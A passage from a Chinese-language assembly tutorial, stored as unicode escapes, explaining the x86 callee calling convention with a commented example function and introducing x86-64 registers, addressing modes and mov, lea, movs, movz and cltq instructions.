\u5982\u679c\u8c03\u7528\u8005\u5728\u8c03\u7528\u4e4b\u540e\u4f7f\u7528\u5b83\u4eec\uff0c\u5219\u9700\u8981\u5728\u8c03\u7528\u4e4b\u524d\u5c06\u5b83\u4eec\u4fdd\u5b58\u5728\u5806\u6808\u4e2d\u5e76\u5728\u8c03\u7528\u4e4b\u540e\u6062\u590d\u5b83\u4eec. \u8bf4\u767d\u4e86\u5c31\u662f\u628a\u6808\u8fd9\u4e2a\u73a9\u610f\u5f53\u4f5c\u4e34\u65f6\u5b58\u653e\u70b9. 3.3.5.2 \u88ab\u8c03\u7528\u8005\u7ea6\u5b9a Callee Rules \u5b50\u4f8b\u7a0b\u7684\u5b9a\u4e49\u5e94\u8be5\u9075\u5faa\u5b50\u4f8b\u7a0b\u5f00\u5934\u7684\u4ee5\u4e0b\u89c4\u5219 : 1.\u5c06 EBP \u7684\u503c\u5165\u6808, \u7136\u540e\u7528\u4e0b\u9762\u7684\u6307\u793a\u4fe1\u606f\u628a ESP \u7684\u503c\u590d\u5236\u5230 EBP \u4e2d : push %ebp mov %esp, %ebp \u8fd9\u4e2a\u521d\u59cb\u64cd\u4f5c\u4fdd\u7559\u4e86\u57fa\u6307\u9488 EBP. \u6309\u7167\u7ea6\u5b9a, \u57fa\u6307\u9488\u4f5c\u4e3a\u6808\u4e0a\u627e\u5230\u53c2\u6570\u548c\u53d8\u91cf\u7684\u53c2\u8003\u70b9. \u5f53\u5b50\u7a0b\u5e8f\u6b63\u5728\u6267\u884c\u7684\u65f6\u5019, \u57fa\u6307\u9488\u4fdd\u5b58\u4e86\u4ece\u5b50\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u662f\u7684\u6808\u6307\u9488\u503c\u7684\u526f\u672c. \u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u5c06\u59cb\u7ec8\u4f4d\u4e8e\u8fdc\u79bb\u57fa\u6307\u9488\u503c\u7684\u5df2\u77e5\u5e38\u91cf\u504f\u79fb\u5904. \u6211\u4eec\u5728\u5b50\u4f8b\u7a0b\u7684\u5f00\u5934\u63a8\u9001\u65e7\u7684\u57fa\u6307\u9488\u503c\uff0c\u4ee5\u4fbf\u7a0d\u540e\u5728\u5b50\u4f8b\u7a0b\u8fd4\u56de\u65f6\u4e3a\u8c03\u7528\u8005\u6062\u590d\u9002\u5f53\u7684\u57fa\u6307\u9488\u503c. \u8bb0\u4f4f, \u8c03\u7528\u8005\u4e0d\u5e0c\u671b\u5b50\u4f8b\u7a0b\u4fee\u6539\u57fa\u6307\u9488\u7684\u503c. \u7136\u540e\u6211\u4eec\u628a\u6808\u6307\u9488\u79fb\u52a8\u5230 EBP \u4e2d, \u4ee5\u83b7\u53d6\u8bbf\u95ee\u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u7684\u53c2\u8003\u70b9. 2.\u63a5\u4e0b\u6765, \u901a\u8fc7\u5728\u6808\u4e2d\u521b\u5efa\u7a7a\u95f4\u6765\u5206\u914d\u5c40\u90e8\u53d8\u91cf. \u56de\u60f3\u4e00\u4e0b, \u6808\u4f1a\u5411\u4e0b\u589e\u957f, \u56e0\u6b64\u8981\u5728\u6808\u9876\u90e8\u521b\u5efa\u7a7a\u95f4, \u6808\u6307\u9488\u5e94\u8be5\u9012\u51cf. \u6808\u6307\u9488\u9012\u51cf\u7684\u6570\u91cf\u53d6\u51b3\u4e8e\u6240\u9700\u5c40\u90e8\u53d8\u91cf\u7684\u6570\u91cf\u548c\u5927\u5c0f. \u4f8b\u5982, \u5982\u679c\u9700\u8981 3 \u4e2a\u5c40\u90e8\u6574\u6570 ( \u6bcf\u4e2a 4 \u5b57\u8282 ), \u5219\u9700\u8981\u5c06\u5806\u6808\u6307\u9488\u9012\u51cf 12, \u4ece\u800c\u4e3a\u8fd9\u4e9b\u5c40\u90e8\u53d8\u91cf\u817e\u51fa\u7a7a\u95f4 ( \u5373sub $12, %esp ). \u548c\u53c2\u6570\u4e00\u6837, \u5c40\u90e8\u53d8\u91cf\u5c06\u4f4d\u4e8e\u57fa\u6307\u9488\u7684\u5df2\u77e5\u504f\u79fb\u5904. 3.\u63a5\u4e0b\u6765, \u4fdd\u5b58\u5c06\u7531\u51fd\u6570\u4f7f\u7528\u7684 \u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u7684 ( Callee-saved ) \u5bc4\u5b58\u5668\u7684\u503c. \u8981\u5b58\u50a8\u5bc4\u5b58\u5668, \u8bf7\u628a\u5b83\u4eec\u5165\u6808. \u88ab\u8c03\u7528\u8005\u4fdd\u5b58 ( Callee-saved ) \u7684\u5bc4\u5b58\u5668\u662f EBX, EDI \u548c ESI ( ESP \u548c EBP \u4e5f\u5c06\u7531\u8c03\u7528\u7ea6\u5b9a\u4fdd\u7559, \u4f46\u5728\u8fd9\u4e2a\u6b65\u9aa4\u4e2d\u4e0d\u9700\u8981\u5165\u6808 ). \u5728\u5b8c\u6210\u8fd9 3 \u6b65\u4e4b\u540e, \u5b50\u4f8b\u7a0b\u7684\u4e3b\u4f53\u53ef\u4ee5\u7ee7\u7eed. \u8fd4\u56de\u5b50\u4f8b\u7a0b\u7684\u65f6\u5019, \u5fc5\u987b\u9075\u5faa\u4ee5\u4e0b\u6b65\u9aa4 : \u5c06\u8fd4\u56de\u503c\u4fdd\u5b58\u5728 EAX \u4e2d. \u6062\u590d\u5df2\u7ecf\u88ab\u4fee\u6539\u7684\u4efb\u4f55\u88ab\u8c03\u7528\u8005\u4fdd\u5b58 ( Callee-saved ) \u7684\u5bc4\u5b58\u5668 ( EDI \u548c ESI ) \u7684\u65e7\u503c. \u901a\u8fc7\u51fa\u6808\u6765\u6062\u590d\u5b83\u4eec. \u5f53\u7136\u5e94\u8be5\u6309\u7167\u76f8\u53cd\u7684\u987a\u5e8f\u628a\u5b83\u4eec\u51fa\u6808. \u91ca\u653e\u5c40\u90e8\u53d8\u91cf. \u663e\u800c\u6613\u89c1\u7684\u6cd5\u5b50\u662f\u628a\u76f8\u5e94\u7684\u503c\u6dfb\u52a0\u5230\u6808\u6307\u9488 ( \u56e0\u4e3a\u7a7a\u95f4\u662f\u901a\u8fc7\u6808\u6307\u9488\u51cf\u53bb\u6240\u9700\u7684\u6570\u91cf\u6765\u5206\u914d\u7684 ). \u4e8b\u5b9e\u4e0a\u5462, \u89e3\u9664\u53d8\u91cf\u91ca\u653e\u7684\u9519\u8bef\u7684\u65b9\u6cd5\u662f\u5c06\u57fa\u6307\u9488\u4e2d\u7684\u503c\u79fb\u52a8\u5230\u6808\u6307\u9488 : mov %ebp, %esp . \u8fd9\u4e2a\u6cd5\u5b50\u6709\u6548, \u662f\u56e0\u4e3a\u57fa\u6307\u9488\u59cb\u7ec8\u5305\u542b\u6808\u6307\u9488\u5728\u5206\u914d\u5c40\u90e8\u53d8\u91cf\u4e4b\u524d\u5305\u542b\u7684\u503c. \u5728\u8fd4\u56de\u4e4b\u524d, \u7acb\u5373\u901a\u8fc7\u628a EBP \u51fa\u6808\u6765\u6062\u590d\u8c03\u7528\u8005\u7684\u57fa\u6307\u9488\u503c. \u56de\u60f3\u4e00\u4e0b, \u6211\u4eec\u5728\u8fdb\u5165\u5b50\u7a0b\u5e8f\u7684\u65f6\u5019\u505a\u7684\u7b2c\u4e00\u4ef6\u4e8b\u662f\u63a8\u52a8\u57fa\u6307\u9488\u4fdd\u5b58\u5b83\u7684\u65e7\u503c. \u6700\u540e, \u901a\u8fc7\u6267\u884c ret \u6307\u4ee4\u8fd4\u56de. \u8fd9\u4e2a\u6307\u4ee4\u5c06\u4ece\u6808\u4e2d\u627e\u5230\u5e76\u5220\u9664\u76f8\u5e94\u7684\u8fd4\u56de\u5730\u5740 ( call \u6307\u4ee4\u4fdd\u5b58\u7684\u90a3\u4e2a ). \u8bf7\u6ce8\u610f, \u88ab\u8c03\u7528\u8005\u7684\u7ea6\u5b9a\u5b8c\u5168\u88ab\u5206\u6210\u4e86\u4e24\u534a, \u7b80\u76f4\u662f\u5f7c\u6b64\u7684\u955c\u50cf. \u7ea6\u5b9a\u7684\u524d\u534a\u90e8\u5206\u9002\u7528\u4e8e\u51fd\u6570\u5f00\u5934, \u5e76\u4e14\u901a\u5e38\u88ab\u79f0\u4e3a\u5b9a\u4e49\u51fd\u6570\u7684 \u5e8f\u8a00 ( prologue ) .\u8fd9\u4e2a\u7ea6\u5b9a\u7684\u540e\u534a\u90e8\u5206\u9002\u7528\u4e8e\u51fd\u6570\u7ed3\u5c3e, \u56e0\u6b64\u901a\u5e38\u88ab\u79f0\u4e3a\u5b9a\u4e49\u51fd\u6570\u7684 \u7ed3\u5c3e ( epilogue ). \u4f8b\u5b50 \u8fd9\u662f\u4e00\u4e2a\u9075\u5faa\u88ab\u8c03\u7528\u8005\u7ea6\u5b9a\u7684\u4f8b\u5b50 : ;\u542f\u52a8\u4ee3\u7801\u90e8\u5206 .text ;\u5c06 myFunc \u5b9a\u4e49\u4e3a\u5168\u5c40 ( \u5bfc\u51fa ) \u51fd\u6570 .globl myFunc .type myFunc, @function myFunc : ;\u5b50\u7a0b\u5e8f\u5e8f\u8a00 push %ebp ;\u4fdd\u5b58\u57fa\u6307\u9488\u65e7\u503c mov %esp, %ebp ;\u8bbe\u7f6e\u57fa\u6307\u9488\u65b0\u503c sub $4, %esp ;\u4e3a\u4e00\u4e2a 4 \u5b57\u8282\u7684\u53d8\u91cf\u817e\u51fa\u4f4d\u7f6e push %edi push %esi ;\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4fee\u6539 EDI \u548c ESI, \u6240\u4ee5\u5148\u7ed9\u5b83\u4eec\u5165\u6808 ;\u4e0d\u9700\u8981\u4fdd\u5b58 EBX, EBP \u548c ESP ;\u5b50\u7a0b\u5e8f\u4e3b\u4f53 mov 8(%ebp), %eax ;\u628a\u53c2\u6570 1 \u7684\u503c\u79fb\u5230 EAX \u4e2d mov 12(%ebp), %esi ;\u628a\u53c2\u6570 2 \u7684\u503c\u79fb\u5230 ESI \u4e2d mov 16(%ebp), %edi ;\u628a\u53c2\u6570 3 \u7684\u503c\u79fb\u5230 EDI \u4e2d mov %edi, -4(%ebp) ;\u628a EDI \u79fb\u7ed9\u5c40\u90e8\u53d8\u91cf add %esi, -4(%ebp) ;\u628a ESI \u6dfb\u52a0\u7ed9\u5c40\u90e8\u53d8\u91cf add -4(%ebp), %eax ;\u5c06\u5c40\u90e8\u53d8\u91cf\u7684\u5185\u5bb9\u6dfb\u52a0\u5230 EAX ( \u6700\u7ec8\u7ed3\u679c ) \u4e2d ;\u5b50\u7a0b\u5e8f\u7ed3\u5c3e pop %esi ;\u6062\u590d\u5bc4\u5b58\u5668\u7684\u503c pop %edi mov %ebp, %esp ;\u91ca\u653e\u5c40\u90e8\u53d8\u91cf pop %ebp ;\u6062\u590d\u8c03\u7528\u8005\u7684\u57fa\u6307\u9488\u503c ret \u5b50\u7a0b\u5e8f\u5e8f\u8a00\u6267\u884c\u6807\u51c6\u64cd\u4f5c, \u5373\u5728 EBP ( \u57fa\u6307\u9488 ) \u4e2d\u4fdd\u5b58\u6808\u6307\u9488\u7684\u526f\u672c, \u901a\u8fc7\u9012\u51cf\u6808\u6307\u9488\u6765\u5206\u914d\u5c40\u90e8\u53d8\u91cf, \u5e76\u5728\u6808\u4e0a\u4fdd\u5b58\u5bc4\u5b58\u5668\u7684\u503c. \u5728\u5b50\u4f8b\u7a0b\u7684\u4e3b\u4f53\u4e2d, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u57fa\u6307\u9488\u7684\u4f7f\u7528. \u5728\u5b50\u7a0b\u5e8f\u6267\u884c\u671f\u95f4, \u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u90fd\u4f4d\u4e8e\u4e0e\u57fa\u6307\u9488\u7684\u5e38\u91cf\u504f\u79fb\u5904. \u7279\u522b\u5730, \u6211\u4eec\u6ce8\u610f\u5230, \u7531\u4e8e\u53c2\u6570\u5728\u8c03\u7528\u5b50\u7a0b\u5e8f\u4e4b\u524d\u88ab\u653e\u5728\u6808\u4e2d, \u56e0\u6b64\u5b83\u4eec\u603b\u662f\u4f4d\u4e8e\u6808\u57fa\u6307\u9488 ( \u5373\u66f4\u9ad8\u7684\u5730\u5740 ) \u4e4b\u4e0b. \u5b50\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u603b\u662f\u53ef\u4ee5\u5728\u5185\u5b58\u5730\u5740 ( EBP+8 ) \u627e\u5230, \u7b2c\u4e8c\u4e2a\u53c2\u6570\u5728 ( EBP+12 ), \u7b2c\u4e09\u4e2a\u53c2\u6570\u5728 ( EBP+16). \u7c7b\u4f3c\u5730, \u7531\u4e8e\u5728\u8bbe\u7f6e\u57fa\u6307\u9488\u540e\u5206\u914d\u5c40\u90e8\u53d8\u91cf, \u56e0\u6b64\u5b83\u4eec\u603b\u662f\u4f4d\u4e8e\u6808\u4e0a\u57fa\u6307\u9488 ( \u5373\u8f83\u4f4e\u5730\u5740 ) \u4e4b\u4e0a. \u7279\u522b\u662f, \u7b2c\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\u603b\u662f\u4f4d\u4e8e ( EBP-4 ), \u7b2c\u4e8c\u4e2a\u4f4d\u4e8e ( EBP-8 ), \u4ee5\u6b64\u7c7b\u63a8. \u8fd9\u79cd\u57fa\u6307\u9488\u7684\u5e38\u89c4\u4f7f\u7528, \u8ba9\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u8bc6\u522b\u51fd\u6570\u5185\u90e8\u5c40\u90e8\u53d8\u91cf\u548c\u53c2\u6570\u7684\u4f7f\u7528. \u51fd\u6570\u7ed3\u5c3e\u57fa\u672c\u4e0a\u662f\u51fd\u6570\u5e8f\u8a00\u7684\u955c\u50cf. \u4ece\u6808\u4e2d\u6062\u590d\u8c03\u7528\u8005\u7684\u5bc4\u5b58\u5668\u503c, \u901a\u8fc7\u91cd\u7f6e\u6808\u6307\u9488\u6765\u91ca\u653e\u5c40\u90e8\u53d8\u91cf, \u6062\u590d\u8c03\u7528\u8005\u7684\u57fa\u6307\u9488\u503c, \u5e76\u7528 ret \u6307\u4ee4\u8fd4\u56de\u8c03\u7528\u8005\u4e2d\u7684\u76f8\u5e94\u4ee3\u7801\u4f4d\u7f6e, \u4ece\u54ea\u6765\u56de\u54ea\u53bb. \u7ef4\u57fa\u767e\u79d1 X86 \u8c03\u7528\u7ea6\u5b9a 3.4 x64 \u6c47\u7f16\u57fa\u7840 3.4.1 \u5bfc\u8bed x86-64 (\u4e5f\u88ab\u79f0\u4e3a x64 \u6216\u8005 AMD64) \u662f 64 \u4f4d\u7248\u672c\u7684 x86/IA32 \u6307\u4ee4\u96c6. \u4ee5\u4e0b\u662f\u6211\u4eec\u5173\u4e8e CS107 \u76f8\u5173\u529f\u80fd\u7684\u6982\u8ff0. 3.4.2 \u5bc4\u5b58\u5668 Registers \u4e0b\u56fe\u5217\u51fa\u4e86\u5e38\u7528\u7684\u5bc4\u5b58\u5668 ( 16\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\u52a0\u4e0a 2 \u4e2a\u7279\u6b8a\u7528\u9014\u5bc4\u5b58\u5668 ). \u6bcf\u4e2a\u5bc4\u5b58\u5668\u90fd\u662f 64 bit \u5bbd, \u5b83\u4eec\u7684\u4f4e 32, 16, 8 \u4f4d\u90fd\u53ef\u4ee5\u770b\u6210\u76f8\u5e94\u7684 32, 16, 8 \u4f4d\u5bc4\u5b58\u5668, \u5e76\u4e14\u90fd\u6709\u5176\u7279\u6b8a\u540d\u79f0. \u4e00\u4e9b\u5bc4\u5b58\u5668\u88ab\u8bbe\u8ba1\u7528\u6765\u5b8c\u6210\u67d0\u4e9b\u7279\u6b8a\u76ee\u7684, \u6bd4\u5982 %rsp \u88ab\u7528\u6765\u4f5c\u4e3a\u6808\u6307\u9488, %rax \u4f5c\u4e3a\u4e00\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c. \u5176\u4ed6\u5bc4\u5b58\u5668\u5219\u90fd\u662f\u901a\u7528\u7684, \u4f46\u662f\u4e00\u822c\u5728\u4f7f\u7528\u7684\u65f6\u5019, \u8fd8\u662f\u8981\u53d6\u51b3\u4e8e\u8c03\u7528\u8005 ( Caller-owned )\u6216\u8005\u88ab\u8c03\u7528\u8005 ( Callee-owned ). \u5982\u679c\u51fd\u6570 binky \u8c03\u7528\u4e86 winky, \u6211\u4eec\u79f0 binky \u4e3a\u8c03\u7528\u8005, winky \u4e3a\u88ab\u8c03\u7528\u8005. \u4f8b\u5982, \u7528\u4e8e\u524d 6 \u4e2a\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u5bc4\u5b58\u5668\u90fd\u662f\u88ab\u8c03\u7528\u8005\u6240\u6709\u7684 ( Callee-owned ). \u88ab\u8c03\u7528\u8005\u53ef\u4ee5\u4efb\u610f\u4f7f\u7528\u8fd9\u4e9b\u5bc4\u5b58\u5668, \u4e0d\u7528\u4efb\u4f55\u9884\u9632\u63aa\u65bd\u5c31\u53ef\u4ee5\u968f\u610f\u8986\u76d6\u91cc\u9762\u7684\u5185\u5bb9. \u5982\u679c %rax \u5b58\u7740\u8c03\u7528\u8005\u60f3\u8981\u4fdd\u7559\u7684\u503c, \u5219 Caller \u5fc5\u987b\u5728\u8c03\u7528\u4e4b\u524d\u5c06\u8fd9\u4e2a %rax \u7684\u503c\u590d\u5236\u5230\u4e00\u4e2a \" \u5b89\u5168 \" \u7684\u4f4d\u7f6e. \u88ab\u8c03\u7528\u8005\u62e5\u6709\u7684 ( Callee-owned ) \u5bc4\u5b58\u5668\u975e\u5e38\u9002\u5408\u4e00\u4e9b\u4e34\u65f6\u6027\u7684\u4f7f\u7528. \u76f8\u53cd, \u5982\u679c\u88ab\u8c03\u7528\u8005\u6253\u7b97\u4f7f\u7528\u8c03\u7528\u8005\u6240\u62e5\u6709\u7684\u5bc4\u5b58\u5668, \u90a3\u4e48\u88ab\u8c03\u7528\u8005\u5fc5\u987b\u9996\u5148\u628a\u8fd9\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u5b58\u8d77\u6765, \u7136\u540e\u5728\u9000\u51fa\u8c03\u7528\u4e4b\u524d\u628a\u5b83\u6062\u590d. \u8c03\u7528\u8005\u62e5\u6709\u7684 ( Caller-owned ) \u5bc4\u5b58\u5668\u7528\u4e8e\u4fdd\u5b58\u8c03\u7528\u8005\u7684\u672c\u5730\u72b6\u6001 ( local state ), \u6240\u4ee5\u8fd9\u4e2a\u5bc4\u5b58\u5668\u9700\u8981\u5728\u8fdb\u4e00\u6b65\u7684\u51fd\u6570\u8c03\u7528\u4e2d\u88ab\u4fdd\u7559\u4e0b\u6765. 3.4.3 \u5bfb\u5740\u6a21\u5f0f Addressing modes \u6b63\u7531\u4e8e\u5b83\u7684 CISC \u7279\u6027, X86-64 \u652f\u6301\u5404\u79cd\u5bfb\u5740\u6a21\u5f0f. \u5bfb\u5740\u6a21\u5f0f\u662f\u8ba1\u7b97\u8981\u8bfb\u6216\u5199\u7684\u5185\u5b58\u5730\u5740\u7684\u8868\u8fbe\u5f0f. \u8fd9\u4e9b\u8868\u8fbe\u5f0f\u7528\u4f5c mov \u6307\u4ee4\u548c\u8bbf\u95ee\u5185\u5b58\u7684\u5176\u5b83\u6307\u4ee4\u7684\u6765\u6e90\u548c\u53bb\u8def. \u4e0b\u9762\u7684\u4ee3\u7801\u6f14\u793a\u4e86\u5982\u4f55\u5728\u6bcf\u4e2a\u53ef\u7528\u7684\u5bfb\u5740\u6a21\u5f0f\u4e2d\u5c06 \u7acb\u5373\u6570 1 \u5199\u5165\u5404\u79cd\u5185\u5b58\u4f4d\u7f6e : movl $1, 0x604892 ;\u76f4\u63a5\u5199\u5165, \u5185\u5b58\u5730\u5740\u662f\u4e00\u4e2a\u5e38\u6570 movl $1, (%rax) ;\u95f4\u63a5\u5199\u5165, \u5185\u5b58\u5730\u5740\u5b58\u5728\u5bc4\u5b58\u5668 %rax \u4e2d movl $1, -24(%rbp) ;\u4f7f\u7528\u504f\u79fb\u91cf\u7684\u95f4\u63a5\u5199\u5165 ;\u516c\u5f0f : (address = base %rbp + displacement -24) movl $1, 8(%rsp, %rdi, 4) ;\u95f4\u63a5\u5199\u5165, \u7528\u5230\u4e86\u504f\u79fb\u91cf\u548c\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ) ;\u516c\u5f0f : (address = base %rsp + displ 8 + index %rdi * scale 4) movl $1, (%rax, %rcx, 8) ;\u7279\u6b8a\u60c5\u51b5, \u7528\u5230\u4e86\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ), \u5047\u8bbe\u504f\u79fb\u91cf ( displacement ) \u4e3a 0 movl $1, 0x8(, %rdx, 4) ;\u7279\u6b8a\u60c5\u51b5, \u7528\u5230\u4e86\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ), \u5047\u8bbe\u57fa\u6570 ( base ) \u4e3a 0 movl $1, 0x4(%rax, %rcx) ;\u7279\u6b8a\u60c5\u51b5, \u7528\u5230\u4e86\u6309\u6bd4\u4f8b\u653e\u5927\u7684\u7d22\u5f15 ( scaled-index ), \u5047\u8bbe\u6bd4\u4f8b ( scale ) \u4e3a0 3.4.4 \u901a\u7528\u6307\u4ee4 Common instructions \u5148\u8bf4\u4e0b\u6307\u4ee4\u540e\u7f00, \u4e4b\u524d\u8bb2\u8fc7\u8fd9\u91cc\u5c31\u91cd\u6e29\u4e00\u904d : \u8bb8\u591a\u6307\u4ee4\u90fd\u6709\u4e2a\u540e\u7f00 ( b, w, l, q ) , \u540e\u7f00\u6307\u660e\u4e86\u8fd9\u4e2a\u6307\u4ee4\u4ee3\u7801\u6240\u64cd\u7eb5\u53c2\u6570\u6570\u636e\u7684\u4f4d\u5bbd ( \u5206\u522b\u4e3a 1, 2, 4 \u6216 8 \u4e2a\u5b57\u8282 ). \u5f53\u7136, \u5982\u679c\u53ef\u4ee5\u4ece\u53c2\u6570\u786e\u5b9a\u4f4d\u5bbd\u7684\u65f6\u5019, \u540e\u7f00\u53ef\u4ee5\u88ab\u7701\u7565. \u4f8b\u5982\u5462, \u5982\u679c\u76ee\u6807\u5bc4\u5b58\u5668\u662f %eax, \u5219\u5b83\u5fc5\u987b\u662f 4 \u5b57\u8282\u5bbd, \u5982\u679c\u662f %ax \u5bc4\u5b58\u5668, \u5219\u5fc5\u987b\u662f 2 \u4e2a\u5b57\u8282, \u800c %al \u5c06\u662f 1 \u4e2a\u5b57\u8282. \u8fd8\u6709\u4e9b\u6307\u4ee4, \u6bd4\u5982 movs \u548c movz \u6709\u4e24\u4e2a\u540e\u7f00 : \u7b2c\u4e00\u4e2a\u662f\u6765\u6e90\u53c2\u6570, \u7b2c\u4e8c\u4e2a\u662f\u53bb\u8def. \u8fd9\u8bdd\u4e4d\u4e00\u770b\u8ba9\u4eba\u6478\u4e0d\u7740\u5934\u8111, \u4e14\u542c\u6211\u5206\u6790. \u4f8b\u5982, movzbl \u8fd9\u4e2a\u6307\u4ee4\u628a 1 \u4e2a\u5b57\u8282\u7684\u6765\u6e90\u53c2\u6570\u503c\u79fb\u52a8\u5230 4 \u4e2a\u5b57\u8282\u7684\u53bb\u8def. \u5f53\u76ee\u6807\u662f\u5b50\u5bc4\u5b58\u5668 ( sub-registers ) \u65f6, \u53ea\u6709\u5b50\u5bc4\u5b58\u5668\u7684\u7279\u5b9a\u5b57\u8282\u88ab\u5199\u5165, \u4f46\u6709\u4e00\u4e2a\u4f8b\u5916 : 32 \u4f4d\u6307\u4ee4\u5c06\u76ee\u6807\u5bc4\u5b58\u5668\u7684\u9ad8 32 \u4f4d\u8bbe\u7f6e\u4e3a 0. mov \u548c lea \u6307\u4ee4 \u5230\u76ee\u524d\u4e3a\u6b62, \u6211\u4eec\u9047\u5230\u7684\u6700\u9891\u7e41\u7684\u6307\u4ee4\u5c31\u662f mov , \u800c\u5b83\u6709\u5f88\u591a\u53d8\u79cd. \u5173\u4e8e mov \u6307\u4ee4\u5c31\u4e0d\u591a\u8bf4\u4e86, \u548c\u4e4b\u524d 32 \u4f4d x86 \u7684\u6ca1\u4ec0\u4e48\u533a\u522b. lea \u6307\u4ee4\u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684, \u4e0a\u4e00\u8282\u90fd\u6709, \u8fd9\u91cc\u5c31\u4e0d\u5e9f\u8bdd\u4e86. \u8fd9\u91cc\u5199\u51e0\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u4f8b\u5b50 : mov 8(%rsp), %eax ;%eax = \u4ece\u5730\u5740 %rsp + 8 \u8bfb\u53d6\u7684\u503c lea 0x20(%rsp), %rdi ;%rdi = %rsp + 0x20 lea (%rdi,%rdx,1), %rax ;%rax = %rdi + %rdx \u5728\u628a\u8f83\u5c0f\u4f4d\u5bbd\u7684\u6570\u636e\u79fb\u52a8\u590d\u5236\u5230\u8f83\u5927\u4f4d\u5bbd\u7684\u60c5\u51b5\u4e0b, movs \u548c movz \u8fd9\u4e24\u4e2a\u53d8\u79cd\u6307\u4ee4\u7528\u4e8e\u6307\u5b9a\u600e\u4e48\u6837\u53bb\u586b\u5145\u5b57\u8282, \u56e0\u4e3a\u4f60\u662f\u4e00\u4e2a\u5c0f\u4e1c\u897f\u88ab\u79fb\u5230\u4e86\u4e00\u4e2a\u5927\u7a7a\u95f4, \u80af\u5b9a\u8fd8\u6709\u5730\u65b9\u662f\u7a7a\u7684, \u6240\u4ee5\u7a7a\u7684\u5730\u65b9\u8981\u586b\u8d77\u6765, \u62ff 0 \u6216\u8005 \u7b26\u53f7\u6269\u5c55 ( sign-extend ) \u6765\u586b\u5145. movsbl %al, %edx ;\u628a 1 \u4e2a\u5b57\u8282\u7684 %al, \u7b26\u53f7\u6269\u5c55 \u590d\u5236\u5230 4 \u5b57\u8282\u7684 %edx movzbl %al, %edx ;\u628a 1 \u4e2a\u5b57\u8282\u7684 %al, \u96f6\u6269\u5c55 ( zero-extend ) \u590d\u5236\u5230 4 \u5b57\u8282\u7684 %edx \u6709\u4e2a\u7279\u6b8a\u60c5\u51b5\u8981\u6ce8\u610f, \u9ed8\u8ba4\u60c5\u51b5\u4e0b, \u5c06 32 \u4f4d\u503c\u5199\u5165\u5bc4\u5b58\u5668\u7684 mov \u6307\u4ee4, \u4e5f\u4f1a\u5c06\u5bc4\u5b58\u5668\u7684\u9ad8 32 \u4f4d\u5f52\u96f6, \u5373\u9690\u5f0f\u96f6\u6269\u5c55\u5230\u4f4d\u5bbd q. \u8fd9\u4e2a\u89e3\u91ca\u4e86\u8bf8\u5982 mov %ebx, %ebx \u8fd9\u79cd\u6307\u4ee4, \u8fd9\u4e9b\u6307\u4ee4\u770b\u8d77\u6765\u5f88\u5947\u602a, \u4f46\u5b9e\u9645\u4e0a\u8fd9\u662f\u7528\u4e8e\u4ece 32 \u4f4d\u6269\u5c55\u5230 64 \u4f4d. \u56e0\u4e3a\u8fd9\u4e2a\u662f\u9ed8\u8ba4\u7684, \u6240\u4ee5\u6211\u4eec\u4e0d\u7528\u663e\u5f0f\u7684 movzlq \u6307\u4ee4. \u5f53\u7136, \u6709\u4e00\u4e2a movslq \u6307\u4ee4\u4e5f\u662f\u4ece 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d. cltq \u6307\u4ee4\u662f\u4e00\u4e2a\u5728 %rax \u4e0a\u8fd0\u884c\u7684\u4e13\u7528\u79fb\u52a8\u6307\u4ee4. \u8fd9\u4e2a\u6ca1\u6709\u53c2\u6570\u7684\u6307\u4ee4\u5728 %rax \u4e0a\u8fdb\u884c\u7b26\u53f7\u6269\u5c55, \u6e90\u4f4d\u5bbd\u4e3a L, \u76ee\u6807\u4f4d\u5bbd\u4e3a q. cltq ;\u5728 \uff05rax \u4e0a\u8fd0\u884c\uff0c\u5c06 4 \u5b57\u8282 src \u7b26\u53f7\u6269\u5c55\u4e3a 8 \u5b57\u8282 dst\uff0c\u7528\u4e8e movslq \uff05eax\uff0c\uff05rax \u7b97\u672f\u548c\u4f4d\u8fd0\u7b97 \u4e8c\u8fdb\u5236\u7684\u8fd0\u7b97\u4e00\u822c\u662f\u4e24\u4e2a\u53c2\u6570, \u5176\u4e2d\u7b2c\u4e8c\u4e2a\u53c2\u6570\u65e2\u662f\u6211\u4eec\u6307\u4ee4\u8fd0\u7b97\u7684\u6765\u6e90, \u4e5f\u662f\u53bb\u8def\u7684\u6765\u6e90, \u5c31\u662f\u8bf4\u6211\u4eec\u628a\u8fd0\u7b97\u7ed3\u679c\u5b58\u5728\u7b2c\u4e8c\u4e2a\u53c2\u6570\u91cc. \u6211\u4eec\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u53ef\u4ee5\u662f\u7acb\u5373\u6570\u5e38\u6570, \u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\u5355\u5143. \u7b2c\u4e8c\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58. \u8fd9\u4e24\u4e2a\u53c2\u6570\u4e2d, \u6700\u591a\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\u662f\u5185\u5b58\u5355\u5143, \u5f53\u7136\u4e5f\u6709\u7684\u6307\u4ee4\u53ea\u6709\u4e00\u4e2a\u53c2\u6570, \u8fd9\u4e2a\u53c2\u6570\u65e2\u662f\u6211\u4eec\u8fd0\u7b97\u6570\u636e\u7684\u6765\u6e90, \u4e5f\u662f\u6211\u4eec\u8fd0\u7b97\u6570\u636e\u7684\u53bb\u8def, 